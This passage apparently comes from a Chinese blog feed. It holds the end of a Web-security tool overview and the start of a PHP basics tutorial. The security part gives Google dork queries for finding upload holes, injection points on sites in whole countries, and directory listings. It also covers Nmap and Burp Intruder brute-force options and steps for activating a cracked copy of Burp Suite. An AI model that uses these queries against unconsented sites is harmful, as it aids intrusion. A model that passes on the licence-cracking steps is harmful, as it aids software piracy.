class="line">例：link:www.baidu.com</span><br><span class="line"></span><br><span class="line">---------美国信息----------</span><br><span class="line">-&gt; 美国跟关键词有关的电话信息，需要指定州名和地点名</span><br><span class="line">other phonebook:where where</span><br><span class="line">例：phonebook:smith ca</span><br><span class="line"></span><br><span class="line">-&gt; 返回商务电话资料</span><br><span class="line">bphonebook:word</span><br><span class="line"></span><br><span class="line">-&gt;关键词相关的住宅电话信息</span><br><span class="line">rphonebook:word</span><br></pre></td></tr></table></figure><h4 id="3-4-不推荐使用"><a href="#3-4-不推荐使用" class="headerlink" title="3.4 不推荐使用"></a>3.4 不推荐使用</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-&gt; 限定时间段，格式是天文学的儒略日，会返回莫名其妙的东西</span><br><span class="line">datarange:time-time</span><br><span class="line"></span><br><span class="line">-&gt; 没用，可以用 filetype 找 ext 文件</span><br><span class="line">ext</span><br><span class="line">  </span><br><span class="line">-&gt; 没用</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">-&gt; 天气（例：北京 tq）</span><br><span class="line">city tq</span><br><span class="line"></span><br><span class="line">-&gt; 天气</span><br><span class="line">city weather</span><br></pre></td></tr></table></figure><h4 id="3-5-高级用法"><a href="#3-5-高级用法" class="headerlink" title="3.5 高级用法"></a>3.5 <a href="https://www.cnblogs.com/lsgxeva/p/10474856.html">高级用法</a></h4><ul><li><p>连接符</p><blockquote><p>默认：多个关键词之间默认 AND</p><ul><li>or：snowblower OR snowmobile 或者 snowblower ( snowmobile OR “Green Bay” )（OR 也可以用 | 代替）</li><li>-：不包括关键字，如：snowblower -“Green Bay”</li><li>+：强制查询被 Google 忽略的常用字</li><li>“” / 《》：精确搜索，防止自动分词</li></ul></blockquote></li><li><p>特征码定位</p><blockquote><p>例：Photoshop CS4任务信息——详细信息：文件创建成功，开始下载数据……等</p><p>可以在浏览器中直接搜索 Photoshop CS4 文件创建成功，开始下载数据……</p></blockquote></li><li><p>其他功能</p><blockquote><p>手气不错：得到 Google 认为最符合你搜索结果的页面，如：president -&gt; www.whitehouse.gov</p><p>多数浏览器大小写敏感，但Google不区分。</p></blockquote></li><li><p>漏洞利用</p><blockquote><ol><li>查看服务器使用的程序：site:xx.com typefile:asp / php / jsp</li><li>上传漏洞：site:xx.com inurl:file / load</li><li>注射点：site:tw / jp / ko inurl:asp?id= （台湾 / 日本 / 韩国）</li><li><code>index of &lt;suffix&gt;</code>：获取网站数据（mp3,admin,jpg,pdf,doc,game,download,password,…）</li></ol></blockquote></li><li><p>关键字</p><blockquote><p>最重要的记住页面一些关键的字 具有一定的特性的比如 [转到父目录]</p><p>这几个字虽然很普通但是不要忘了一般有遍历目录漏洞的站点都有如下漏洞</p><ol><li>bbs/data/+转到父目录</li><li>data/+转到父目录</li><li>/+转到父目录</li><li>转到父目录rmvb</li><li>inurl:/diy.asp</li></ol></blockquote></li></ul><h4 id="3-6-案例"><a href="#3-6-案例" class="headerlink" title="3.6 案例"></a>3.6 案例</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-&gt; 搜索C++ vector但去掉csdn加上博客园</span><br><span class="line">C++ vector -&quot;csdn&quot; +&quot;bokee.com&quot;</span><br></pre></td></tr></table></figure><h3 id="4-Firefox"><a href="#4-Firefox" class="headerlink" title="4 Firefox"></a>4 Firefox</h3><blockquote><p>配置：</p><ul><li>不安全链接：about:config——security.enterprise_roots.enabled = true</li><li>禁用JS：about:config——javascript.enabled = false</li></ul><p>插件：</p><ul><li>SwitchyOmega：代理软件</li><li>hackbar：网盘安装。</li></ul><p>burp suite证书：</p><ul><li>下载证书：<a href="http://burp">http://burp</a></li><li>选项——高级——证书——导入证书</li></ul></blockquote><h3 id="5-网络空间安全"><a href="#5-网络空间安全" class="headerlink" title="5 网络空间安全"></a>5 网络空间安全</h3><blockquote><p>shodan：</p><ul><li><a href="https://www.shodan.io/">Shodan Search Engine</a></li></ul><p>Zoomeye：</p><ul><li><p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)</a></p></li><li><p><a href="https://www.zoomeye.org/component">组件页面</a></p></li></ul><p>FOFA：</p><ul><li><a href="https://fofa.info/">FOFA网络空间测绘系统</a></li></ul><p>Quake：网络空间测绘：</p><ul><li><a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></li></ul></blockquote><h3 id="6-CDN"><a href="#6-CDN" class="headerlink" title="6 CDN"></a>6 CDN</h3><blockquote><p>内容分发网络。</p></blockquote><hr><h2 id="三、发包工具"><a href="#三、发包工具" class="headerlink" title="三、发包工具"></a>三、发包工具</h2><h3 id="1-curl"><a href="#1-curl" class="headerlink" title="1 curl"></a>1 curl</h3><blockquote><p><a href="https://github.com/curl/curl">curl安装</a></p></blockquote><ul><li>命令<ul><li><code>curl url</code>：get请求</li><li><code>curl -X -POST / -XPOST [ -d &#39;&#123; key:value &#125;&#39; ] url</code>：post请求（-d携带数据）</li><li><code>curl -XPUT url</code>：上传数据</li><li><code>curl -XDELETE url</code>：删除数据</li></ul></li><li>参数<ul><li><code>-H &#39;str&#39;</code>：加入首部（只带一个，多个需要写多个-H）</li><li>-I：获得首部响应信息</li><li>-O：下载到当前文件夹</li><li><code>-o path url</code>：指定下载路径</li><li><code>--limit-rate &lt;v&gt; url</code>：限制下载速度（默认字节）（和-O / -o一起使用）</li><li>-C - ：终止下载后恢复下载（和-O / -o一起使用）</li><li>-L：跟随重定向（默认不跟随）</li><li>-v：显示底层链接信息</li><li><code>-u user:passwd</code>：认证用户名和密码（和-O / -o一起使用可以利用 FTP 协议下载文件，-T path url：则可以利用 FTP 上传文件）</li><li><code>--proxy &quot;protocol://user:passwd@proxy_ip:port&quot; url</code>：挂代理访问</li></ul></li></ul><hr><h2 id="四、集成工具"><a href="#四、集成工具" class="headerlink" title="四、集成工具"></a>四、集成工具</h2><h3 id="1-BurpSuite"><a href="#1-BurpSuite" class="headerlink" title="1 BurpSuite"></a>1 BurpSuite</h3><h4 id="1-1-注册"><a href="#1-1-注册" class="headerlink" title="1.1 注册"></a>1.1 注册</h4><ol><li>打开 Burp Suite Professional CN.vbs。</li><li>打开 BurpSuiteLoader.jar。</li><li>复制 License 到 vbs 中。</li><li>复制 Requset 到 jar 中。</li><li>复制 Response 到 vbs 中。</li></ol><h4 id="1-2-Intruder"><a href="#1-2-Intruder" class="headerlink" title="1.2 Intruder"></a>1.2 Intruder</h4><p><strong>攻击类型</strong></p><ol><li><p>默认为sniper模式</p><blockquote><p>即如果有多个变量，对每个变量依次进行破解，一次只替换一个变量。</p><p>也就是说，如果有username和password两个变量，那么它会先对username进行爆破，password字段不会改变，然后username不变，再对password字段进行爆破。</p></blockquote></li><li><p>Battering ram 模式</p><blockquote><p>对多个变量同时进行破解。</p><p>比如有username和password两个字段，使用字典进行破解，那么每次都会用字典中的一个值将两个变量同时替换。</p></blockquote></li><li><p>pitchfork模式</p><blockquote><p>每个变量对应一个字典，比如username和password，依次取其对应的字典中的一条数据对相应变量进行替换，如果两个字典条数不一样，那么一共会执行条数较少的那么多次，即不会交叉替换，只会按每个字典的顺序进行替换。</p></blockquote></li><li><p>Cluster bomb模式</p><blockquote><p>这种模式在pitchfork模式上进行了改进， 即把不同变量对应的字典中的值进行了排列组合，实现了不同的组合攻击。</p></blockquote></li></ol><p><strong>有效载荷类型</strong></p><ol><li><p>简单清单</p><blockquote><p>字典。</p></blockquote></li><li><p>递归搜索</p><blockquote><p>从服务器获得的响应包作为参数进行请求。</p><p>此时攻击类型应该选音叉，请求线程数设置为1，在Options——Grep-Extract中点击添加，获得响应，选定数据作为有效负载。</p></blockquote></li></ol><h3 id="2-Metaspolit（KaliLinux）"><a href="#2-Metaspolit（KaliLinux）" class="headerlink" title="2 Metaspolit（KaliLinux）"></a>2 Metaspolit（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><hr><h2 id="五、信息收集"><a href="#五、信息收集" class="headerlink" title="五、信息收集"></a>五、信息收集</h2><h3 id="1-maltego（KaliLinux）"><a href="#1-maltego（KaliLinux）" class="headerlink" title="1 maltego（KaliLinux）"></a>1 maltego（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p><p>被动信息收集一键版【kali】</p></blockquote><h3 id="2-sn0int（KaliLinux）"><a href="#2-sn0int（KaliLinux）" class="headerlink" title="2 sn0int（KaliLinux）"></a>2 sn0int（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p><p>被动信息收集工具集【kali】</p></blockquote><h3 id="3-Nmap（KaliLinux）"><a href="#3-Nmap（KaliLinux）" class="headerlink" title="3 Nmap（KaliLinux）"></a>3 Nmap（KaliLinux）<img src="/posts/5cfe0bd9/Nmap.jpg" alt="img"></h3><blockquote><p><a href="https://nmap.org/dist/nmap-7.93-setup.exe">zenmap安装</a></p><p>主要功能：主机存活检测、端口探测、服务识别、操作系统识别。</p><p>Q1：无结果显示后就新建一个扫描。</p></blockquote><h4 id="3-1-扫描方式"><a href="#3-1-扫描方式" class="headerlink" title="3.1 扫描方式"></a>3.1 扫描方式</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sS / sT / sA / sW / sM</td><td>TCP SYN扫描（半开扫描，默认扫描方式）、TCP connect()扫描、ACK扫描、TCP窗口扫描、TCP Maimon扫描</td></tr><tr><td>-sU</td><td>UDP扫描</td></tr><tr><td>-sN / sF / sX</td><td>TCP Null扫描、FIN扫描、Xmas扫描</td></tr><tr><td>—scanflags</td><td>自定义TCP包中的 flags</td></tr><tr><td>-sI zombie host[ : probeport ]</td><td>通过指定的僵尸主机发送扫描数据包</td></tr><tr><td>-sY / sZ</td><td>SCTP INIT扫描和COOKIE-ECHO扫描</td></tr><tr><td>-sO</td><td>使用IP扫描确定目标机支持的协议类型</td></tr><tr><td>-b “FTP relay host”</td><td>使用FTP bounce扫描</td></tr></tbody></table></div><h4 id="3-2-主机存活发现"><a href="#3-2-主机存活发现" class="headerlink" title="3.2 主机存活发现"></a>3.2 主机存活发现</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sL</td><td>仅仅显示扫描的IP地址数目，不会进行任何扫描</td></tr><tr><td>-sn</td><td>ping 扫描，即主机发现</td></tr><tr><td>-Pn</td><td>不检测主机存活</td></tr><tr><td>-PS / PA / PU / PY[ portlist ]</td><td>使用TCP SYN ping、TCP ACK ping、UDP ping发现主机</td></tr><tr><td>-PE / PP / PM</td><td>使用ICMP信息请求、时间戳请求、地址掩码请求包发现主机</td></tr><tr><td>-PO[ protocol list ]</td><td>使用IP协议包探测对方主机是否开启</td></tr><tr><td>-n / -R</td><td>不对IP地址进行域名反向解析、对所有IP地址都进行域名的反向解析</td></tr></tbody></table></div><h4 id="3-3-主机端口发现"><a href="#3-3-主机端口发现" class="headerlink" title="3.3 主机端口发现"></a>3.3 主机端口发现</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p</td><td>指定端口或端口范围。（-p 80 / -p 1-65535）</td></tr><tr><td>-p U : PORT</td><td>扫描UDP的某个端口。（-p U:53）</td></tr><tr><td>-F</td><td>快速扫描模式，比默认扫描的端口少</td></tr><tr><td>-r</td><td>不随机扫描端口，默认是随机扫描</td></tr><tr><td>-top-ports “number”</td><td>扫描开放概率最高的 number 个端口。开放概率参考 nmap-services文件，Ubuntu中在/usr/share/nmap.nmap中，默认扫描前1000个</td></tr></tbody></table></div><h4 id="3-4-服务版本识别"><a href="#3-4-服务版本识别" class="headerlink" title="3.4 服务版本识别"></a>3.4 服务版本识别</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-sV</td><td>开放版本检测，可以同时使用-A 进行操作系统检测和版本检测</td></tr><tr><td>—version-intensity “level”</td><td>设置版本扫描强度，level指定使用哪些检测报文，越高服务越可能被正确识别，默认7</td></tr><tr><td>—version-light</td><td>轻量模式，为—version-intensity 2 别名。</td></tr><tr><td>—version-all</td><td>所有检测，为—version-intensity 9 别名</td></tr><tr><td>—version-trace</td><td>显示详细的版本检测过程信息</td></tr></tbody></table></div><h4 id="3-5-操作系统识别"><a href="#3-5-操作系统识别" class="headerlink" title="3.5 操作系统识别"></a>3.5 操作系统识别</h4><blockquote><p>所有操作系统信息存在nmap-os-db中</p></blockquote><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-O</td><td>操作系统检测，可以同时使用-A 进行操作系统检测和版本检测</td></tr><tr><td>—osscan-limit</td><td>针对指定的目标进行操作系统检测（至少需确知该主机分别有一个 open 和 closed 端口）</td></tr><tr><td>—osscan-guess</td><td>推测操作系统检测结果。Nmap无法确定时会尽可能提供最相近匹配，这是默认匹配模式</td></tr></tbody></table></div><h4 id="3-6-输出结果"><a href="#3-6-输出结果" class="headerlink" title="3.6 输出结果"></a>3.6 输出结果</h4><div class="table-container"><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-oN</td><td>将标准输出直接写入指定的文件</td></tr><tr><td>-oX</td><td>输出XML文件</td></tr><tr><td>-oS</td><td>输出全大写</td></tr><tr><td>-oG</td><td>输出便于通过bash或Perl处理的格式，而非XML文件</td></tr><tr><td>-oA BASENAME</td><td>将扫描结果以标准格式、XML格式和Grep格式一次性输出</td></tr><tr><td>-v</td><td>提高输出的详细度</td></tr><tr><td>-d level</td><td>设置 debug 级别，最高是 9</td></tr><tr><td>—reason</td><td>显示端口处于特定状态的原因</td></tr><tr><td>—open</td><td>只输出端口状态为open的端口</td></tr><tr><td>—packet-trace</td><td>显示所有发送或者接收到的数据包</td></tr><tr><td>—iflist</td><td>显示路由信息和端口</td></tr><tr><td>—log-errors</td><td>输出日志等级为 errors 和 warnings 的日志</td></tr><tr><td>—append-output</td><td>追加到指定文件后</td></tr><tr><td>—resume FILENAME</td><td>恢复已停止的扫描</td></tr><tr><td>—stylesheet PAHT / URL</td><td>将 XML 输出转化为 HTML 和 XSL 样式表</td></tr><tr><td>—Webxml</td><td>从nmap.org得到 XML 的样式</td></tr><tr><td>—-no-stylesheet</td><td>忽略 XML 声明的 XSL 样式表</td></tr><tr><td><code>--scrpit &lt;script&gt;</code></td><td>使用脚本检测（nmap自带脚本库）</td></tr></tbody></table></div><h3 id="4-AWVS：Web扫描"><a href="#4-AWVS：Web扫描" class="headerlink" title="4 AWVS：Web扫描"></a>4 AWVS：Web扫描</h3><blockquote><p>带参启动路径（管理员身份启动，不然可能无法添加目标）：<code>&quot;C:\Program Files (x86)\Acunetix\13.0.200205121\proto.exe&quot; awvs://launch/</code></p><p>Target——Add Target：创建新URL。</p><p>Target——点击URL——设置扫描强度和速度——扫描：</p><ul><li>扫描类型</li><li>报告生成方式</li><li>漏洞日程</li></ul></blockquote><h3 id="5-X-ray：Web扫描"><a href="#5-X-ray：Web扫描" class="headerlink" title="5 X-ray：Web扫描"></a>5 X-ray：Web扫描</h3><h3 id="6-Nessus：主机扫描"><a href="#6-Nessus：主机扫描" class="headerlink" title="6 Nessus：主机扫描"></a>6 Nessus：主机扫描</h3><hr><h2 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h2><h3 id="1-Sqlmap（KaliLinux）"><a href="#1-Sqlmap（KaliLinux）" class="headerlink" title="1 Sqlmap（KaliLinux）"></a>1 Sqlmap（KaliLinux）</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><h3 id="2-Gopher（KaliLinux）：SSRF利用"><a href="#2-Gopher（KaliLinux）：SSRF利用" class="headerlink" title="2 Gopher（KaliLinux）：SSRF利用"></a>2 Gopher（KaliLinux）：SSRF利用</h3><h3 id="3-Jeboss（KaliLinux）"><a href="#3-Jeboss（KaliLinux）" class="headerlink" title="3 Jeboss（KaliLinux）"></a>3 Jeboss（KaliLinux）</h3><h3 id="4-BeEf（KaliLinux）：XSS攻击"><a href="#4-BeEf（KaliLinux）：XSS攻击" class="headerlink" title="4 BeEf（KaliLinux）：XSS攻击"></a>4 BeEf（KaliLinux）：XSS攻击</h3><hr><h2 id="七、Webshell"><a href="#七、Webshell" class="headerlink" title="七、Webshell"></a>七、Webshell</h2><h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1 蚁剑"></a>1 蚁剑</h3><blockquote><p><a href="https://github.com/AntSwordProject/">蚁剑下载</a></p><p>Q1：返回数据为空</p><p>A1：编码器和解码器都选base64</p></blockquote><hr><h2 id="八、目录工具"><a href="#八、目录工具" class="headerlink" title="八、目录工具"></a>八、目录工具</h2><h3 id="1-subdomainsbrute：子域名爆破"><a href="#1-subdomainsbrute：子域名爆破" class="headerlink" title="1 subdomainsbrute：子域名爆破"></a>1 subdomainsbrute：子域名爆破</h3><h3 id="2-dirb（KaliLinux）：目录扫描"><a href="#2-dirb（KaliLinux）：目录扫描" class="headerlink" title="2 dirb（KaliLinux）：目录扫描"></a>2 dirb（KaliLinux）：目录扫描</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><h3 id="3-dirsearch（KaliLinux）：目录扫描"><a href="#3-dirsearch（KaliLinux）：目录扫描" class="headerlink" title="3 dirsearch（KaliLinux）：目录扫描"></a>3 dirsearch（KaliLinux）：目录扫描</h3><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p></blockquote><h3 id="4-御剑后台扫描：目录扫描"><a href="#4-御剑后台扫描：目录扫描" class="headerlink" title="4 御剑后台扫描：目录扫描"></a>4 御剑后台扫描：目录扫描</h3><h3 id="5-Tkbscan：Web路径探测"><a href="#5-Tkbscan：Web路径探测" class="headerlink" title="5 Tkbscan：Web路径探测"></a>5 Tkbscan：Web路径探测</h3><hr><h2 id="九、编程语言"><a href="#九、编程语言" class="headerlink" title="九、编程语言"></a>九、编程语言</h2><blockquote><p><a href=".\2810fc66">text::Python渗透</a></p></blockquote><hr><h2 id="十、测试网站"><a href="#十、测试网站" class="headerlink" title="十、测试网站"></a>十、测试网站</h2><ul><li>ping网站：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li><p>测试网站：<a href="http://demo.testfire.net/">Altoro Mutual (testfire.net)</a></p></li><li><p>本地搭建：DWVA——配置文件改后缀——改密码和数据库一样（root/root）</p><ul><li>sqli-labs：<a href="https://gitcode.net/mirrors/audi-1/sqli-labs?utm_source=csdn_github_accelerator（db-creds.inc：改密码）">https://gitcode.net/mirrors/audi-1/sqli-labs?utm_source=csdn_github_accelerator（db-creds.inc：改密码）</a></li><li>ctf-wiki：<a href="https://github.com/ctf-wiki/ctf-wiki">ctf-wiki/ctf-wiki: Come and join us, we need you! (github.com)</a> &amp;&amp; <a href="https://blog.csdn.net/qq_60923912/article/details/124288187">(8条消息) ctf-wiki本地搭建记录_如何下载ctfwiki_goodlunatic的博客-CSDN博客</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/posts/c036635b.html"/>
      <url>/posts/c036635b.html</url>
      
        <content type="html"><![CDATA[<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><hr><h2 id="一、服务器知识"><a href="#一、服务器知识" class="headerlink" title="一、服务器知识"></a>一、服务器知识</h2><blockquote><p>基础知识：</p><ul><li><p><a href="https://www.bccn.net/run/">在线编程</a></p></li><li><p><a href="https://www.w3.org/">official::W3C</a>：制定规范。</p></li><li><p><a href="http://info.cern.ch/">全网第一个网页</a></p></li></ul><p>其他知识：</p><ul><li>C/S（胖客户端），B/S（瘦客户端）</li><li>PWA：Progressive web app</li><li>浏览器 flash 默认关闭。</li><li>服务端技术：CGI，PHP，ASP，JSP，<a href="http://asp.net/">ASP.NET</a></li><li>MIME（多用途网际邮件扩充协议）：是一种标准，用来表示文档、文件或字节流的性质和格式。    <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME</a></li></ul><p>WAMP是指： Windows + Apache + Mysql + PHP</p><p>LAMP是指：Linux + Apache + Mysql + PHP</p></blockquote><div class="table-container"><table><thead><tr><th><strong>传统内核</strong></th><th><strong>对应浏览器</strong></th><th><strong>新内核</strong></th></tr></thead><tbody><tr><td>Trident</td><td>IE</td><td></td></tr><tr><td>T+W（双核）</td><td>搜狗，360，遨游</td><td></td></tr><tr><td>Webkit</td><td>Safari</td><td></td></tr><tr><td>Webkit</td><td>Chrome</td><td>Blink（微信小程序内核）</td></tr><tr><td>Presto</td><td>Opera</td><td>Blink</td></tr><tr><td>Gecko</td><td>Firefox</td><td>Servo</td></tr></tbody></table></div><hr><h2 id="二、PHP语言基础"><a href="#二、PHP语言基础" class="headerlink" title="二、PHP语言基础"></a>二、PHP语言基础</h2><blockquote><p><a href="https://www.php.net/">official::PHP: Hypertext Preprocessor</a></p></blockquote><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>PHP是一种运行在服务器端的脚本语言，可以嵌入到 HTML 中。</p><p>标记方式（前两种基本弃用，开启：php.ini——short_open_tag / asp_tags）：</p><ul><li>ASP标记：<code>&lt;% code %&gt;</code></li><li>短标记：<code>&lt;? code ?&gt;</code>（“&lt;?=”是PHP的一个短的开放式标签，是echo() 的快捷用法。）</li><li>脚本标记：<code>&lt;script language=&quot;php&quot;&gt;code&lt;/script&gt;</code></li><li>标准标记（常用）：<code>&lt;?php code ?&gt;</code></li></ul><p>注释：</p><ul><li>行注释：// # </li><li>块注释：/<em> </em>/</li></ul><p>语句间用 <code>;</code>隔开，<code>?&gt;</code>会自带所以最后一个语句可以不写。</p><p>注：<code>&lt;?php code ?&gt;</code>使用时可以不写 ?&gt;，这样后面的空行都会解析成php而不是html，从而节约行数。</p></blockquote><h3 id="2-变量与常量"><a href="#2-变量与常量" class="headerlink" title="2 变量与常量"></a>2 变量与常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="variable">$var</span>;</span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line"><span class="variable">$var</span> = <span class="number">1</span>;</span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$var</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 超全局变量：系统定义的变量（如：预定义变量）</span></span><br><span class="line"><span class="comment">// 预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）。</span></span><br><span class="line"><span class="variable">$_GET</span> <span class="comment">// 获取所有以 get 方式提交的数据的表单</span></span><br><span class="line"><span class="variable">$_POST</span> <span class="comment">// 获取 post 提交的数据</span></span><br><span class="line"><span class="variable">$_REQUEST</span> <span class="comment">// get、post和cookie的（重名不同服务器处理情况不同，一般不用）</span></span><br><span class="line"><span class="variable">$GLOBALS</span> <span class="comment">// PHP中所有的全局变量</span></span><br><span class="line"><span class="variable">$_SERVSER</span> <span class="comment">// 服务器信息</span></span><br><span class="line"><span class="variable">$_SESSION</span> <span class="comment">// session 会话数据</span></span><br><span class="line"><span class="variable">$_COOKIE</span> <span class="comment">// cookie 会话数据</span></span><br><span class="line"><span class="variable">$_ENV</span> <span class="comment">// 环境信息</span></span><br><span class="line"><span class="variable">$_FILES</span> <span class="comment">// 用户上传的文件信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 有趣案例</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>; <span class="variable">$b</span> = <span class="string">&#x27;abc&#x27;</span>; <span class="keyword">echo</span> <span class="variable">$$a</span> == <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常量（不要$，否则会认为成变量）</span></span><br><span class="line"><span class="comment">//1、可以定义特殊字符，例：define( &quot;-_-&quot; , &quot;smile&quot; )，参数三表示对大小写敏感，默认 false 不敏感 </span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;name&quot;</span>,value[,<span class="literal">false</span>]);</span><br><span class="line"><span class="comment">//2、5.3之后才有</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">name</span> = value;</span><br><span class="line"></span><br><span class="line"><span class="comment">//系统常量</span></span><br><span class="line">PHP_VERSION <span class="comment">// PHP版本号。</span></span><br><span class="line">PHP_INT_SIZE <span class="comment">// 整形大小。</span></span><br><span class="line">PHP_INT_MAX <span class="comment">// 整形能表示的最大值。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//魔术常量：随环境变化，用户无法改变。</span></span><br><span class="line"><span class="keyword">__DIR__</span> <span class="comment">// 当前被执行的脚本所在电脑的绝对路径。</span></span><br><span class="line"><span class="keyword">__FILE__</span> <span class="comment">// 当前被执行的脚本所在电脑的绝对路径。（带自己文件的名字）</span></span><br><span class="line"><span class="keyword">__LINE__</span> <span class="comment">// 当前所属的行数。</span></span><br><span class="line"><span class="keyword">__NAMESPACE__</span> <span class="comment">// 当前所属的命名空间。</span></span><br><span class="line"><span class="keyword">__CLASS__</span> <span class="comment">// 当前所属的类。</span></span><br><span class="line"><span class="keyword">__METHOD__</span> <span class="comment">// 当前所属的方法。</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span> <span class="comment">// 当前函数名字</span></span><br></pre></td></tr></table></figure><h3 id="3-内存"><a href="#3-内存" class="headerlink" title="3 内存"></a>3 内存</h3><ul><li><p><strong>区域</strong></p><ul><li>栈区：程序可以操作的内存部分（不存数据，运行程序代码)，少但是快。</li><li>代码段：存储程序的内存部分（不执行)。</li><li>数据段：存储普通数据（全局区和静态区）。</li><li>堆区：存储复杂数据，大但是效率低。</li></ul></li><li><p><strong>传递</strong></p><ul><li>值传递：$a = $b ; ，在数据段重新生成数据。</li><li>引用传递：<code>$a = &amp;$b ;</code> ，地址传递。</li></ul></li></ul><h3 id="4-文件包含"><a href="#4-文件包含" class="headerlink" title="4 文件包含"></a>4 文件包含</h3><blockquote><p>在一个PHP脚本中去将另一个文件包含进来。（同C的 include）</p></blockquote><ul><li><p>文件包含的意义：</p><ol><li>要么使用被包含文件中的内容，实现代码的共享（重用)：向上包含（索要）<blockquote><p>向上包含：在当前脚本要用某个代码之前包含别的文件。</p></blockquote></li><li>要么自己有东西可以给别的文件使用，实现代码的共享(重用)：向下包含(给予)。<blockquote><p>向下包含：在自己有某个东西的时候，需要别的脚本来显示(自己代码写完之后包含其他文件)。</p></blockquote></li><li>最大的作用：分工协作，每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情。</li></ol></li><li><p>在PHP中文件的包含有四种形式（两种大形式）</p><ul><li>lnclude：包含文件。</li><li>Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次)。</li><li>Require：与include相同</li><li>Require_once：与include_once相同</li></ul></li><li><p>包含：<code>Include &#39; file &#39; 或 Include( &#39; file &#39; );</code></p><blockquote><p>Include与Require：本质一样，但Include报错是Warning，不影响后面可执行代码的执行；而Require报错是Fatal error，后面语句将不会执行。</p></blockquote></li><li><p>PHP代码的执行流程：</p><ol><li>读取代码文件。(PHP程序)</li><li>编译:将PHP代码转换成字节码。（生成opcode) </li><li>zendengine来解析opcode，按照字节码去进行逻辑运算。</li><li>转换成对应的HTML代码。</li></ol></li><li><p>文件加载原理：</p><ol><li>在文件加载（ include 或者require〉的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li><li>加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</li><li>在PHP中被包含的文件是单独进行编译的。<blockquote><p>PHP文件在编译的过程中如果出现了语法错误，那么会失败〈不会执行)；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。<br>注意路径：相对路径指的是当前执行文件下的路径（多次包含文件时可能会失效），可以用”file/file.php”而非”./file/file.php”。</p></blockquote></li></ol></li></ul><h3 id="5-数据类型"><a href="#5-数据类型" class="headerlink" title="5 数据类型"></a>5 数据类型</h3><blockquote><p>PHP是一种弱类型语言，变量本身没有数据类型。</p><p>区分：三大类八小类。</p></blockquote><ul><li>简单（基本）数据类型：4个小类。<ul><li>整型：int/integer，系统分配4个字节存储，表示整数类型。（有前提）</li><li>浮点型：float/double，系统分配8个字节存储，表示小数或者整型存不下的整数。</li><li>字符串型: string，系统根据实际长度分配，表示字符串。（引号）</li><li>布尔类型：bool/boolean，表示布然类型，只有两个值: true和 false。</li></ul></li><li>复合数据类型：2个小类。<ul><li>对象类型：object，存放对象。（面向对象）</li><li>数组类型: array，存储多个数据。（一次性）</li></ul></li><li>特殊数据类型：2个小类。<ul><li>资源类型：resource，存放资源数据。（PHP外部数据，如数据库、文件)</li><li>空类型：NULL，只有一个值就是NULL。(不能运算）</li></ul></li></ul><blockquote><p>类型转化：自动，手动<code>(int)$a</code></p></blockquote><ul><li>字符串转数字<ol><li>以字母开头的字符串，永远为0。</li><li>以数字开头的字符串，取到碰到字符串为止。（不会同时包含两个小数点)</li></ol></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类型判断</span></span><br><span class="line"><span class="title function_ invoke__">is_type</span>( <span class="variable">$name</span> );</span><br><span class="line"><span class="comment">// 类型查看</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="variable">$one</span> , <span class="variable">$two</span> , ... );</span><br><span class="line"><span class="comment">// 获得类型，返回的是字符串</span></span><br><span class="line"><span class="title function_ invoke__">Gettype</span>( <span class="variable">$name</span> );</span><br><span class="line"><span class="comment">// 